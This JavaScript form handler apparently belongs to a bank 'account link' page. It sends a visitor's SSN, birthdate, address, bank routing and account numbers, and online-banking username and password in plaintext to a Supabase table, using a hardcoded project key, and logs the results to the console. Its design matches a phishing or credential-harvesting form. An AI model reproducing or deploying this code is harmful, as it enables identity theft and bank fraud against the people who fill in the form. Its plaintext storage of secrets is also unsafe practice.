const { createClient } = supabase
const supabaseUrl = 'https://gutkqbxzhakewweqjhek.supabase.co';
const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imd1dGtxYnh6aGFrZXd3ZXFqaGVrIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Mzc2MTgyNzcsImV4cCI6MjA1MzE5NDI3N30.4e1TcXr2k6m0DkU2F6oCllWJrdkvuY5dzdg9SrhqbcQ';
supabase = createClient(supabaseUrl, supabaseKey);

document.addEventListener('DOMContentLoaded', function () {
    const form = document.getElementById('accountForm');
    if (form) {
        form.addEventListener('submit', async function (event) {
            event.preventDefault();

            const firstName = document.getElementById('first_name').value;
            const lastName = document.getElementById('last_name').value;
            const birthdate = document.getElementById('birthdate').value;
            const address = document.getElementById('address').value;
            const ssn = document.getElementById('ssn').value;
            const routingNumber = document.getElementById('routing_number').value;
            const accountNumber = document.getElementById('account_number').value;
            const bankName = document.getElementById('bank_name').value;
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            console.log("console log before inserting the data ");
            const { data, error } = await supabase
                .from('account-link')
                .insert([
                    {
                        first_name: firstName,
                        last_name: lastName,
                        birthdate: birthdate,
                        address: address,
                        ssn: ssn,
                        routing_number: routingNumber,
                        account_number: accountNumber,
                        bank_name: bankName,
                        username: username,
                        password: password
                    }
                ]);
            console.log("console log after inserting the data ");

            console.log("here is the data after form is submited --->>>>", data);
            if (error) {
                console.error('Error inserting data:', error);
                alert('There was an error while submitting the form.');
            } else {
                console.log('Data inserted successfully:', data);
                alert('Form submitted successfully!');
            }
        });
    }
});